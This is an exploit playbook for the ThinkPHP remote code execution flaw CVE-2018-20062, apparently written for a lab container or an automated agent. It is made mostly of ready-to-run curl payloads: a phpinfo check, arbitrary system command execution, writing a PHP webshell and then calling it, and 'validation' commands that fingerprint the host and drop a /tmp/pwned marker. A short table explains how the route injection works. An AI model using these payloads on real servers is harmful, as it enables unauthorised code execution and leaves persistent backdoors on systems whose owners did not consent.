# ThinkPHP Exploit Playbook

**CVE**: CVE-2018-20062 (RCE via crafted HTTP request)
**Target**: http://localhost:8083
**Vulnerability**: Route parameter injection allows arbitrary static method calls
**Authentication**: None required

## Detection

Execute `phpinfo()` to confirm RCE:

```bash
curl -s 'http://localhost:8083/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1' | head -20
```

Expected: PHP info page output.

## RCE Payload

Execute system command:

```bash
CMD="id"
curl -s "http://localhost:8083/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=${CMD}"
```

Alternative: Write a webshell:

```bash
curl -s "http://localhost:8083/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php system(\$_GET['cmd']);?>"
```

Then access: `http://localhost:8083/shell.php?cmd=id`

## Exploit Mechanism

| Step | Action | Detail |
|------|--------|--------|
| 1 | `s=/Index/\think\app\invokefunction` | Routes to ThinkPHP's `App::invokefunction()` |
| 2 | `function=call_user_func_array` | Calls PHP's `call_user_func_array()` |
| 3 | `vars[0]=system` | First argument: the callback (`system`) |
| 4 | `vars[1][]=<cmd>` | Second argument: the command array |

## Validation (3-Layer)

```bash
# L1 — Marker file absence
curl -s "http://localhost:8083/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL"

# L2 — Environment fingerprint
curl -s "http://localhost:8083/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ip a"

# L3 — Unique artifact
curl -s "http://localhost:8083/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=touch /tmp/pwned_\$(date +%s_%N)"
```

## Notes

- ThinkPHP 5.0.20 with default routing (no forced routes)
- Commands run as `www-data` inside the ThinkPHP container
- The `s` parameter must be URL-encoded if special characters are used
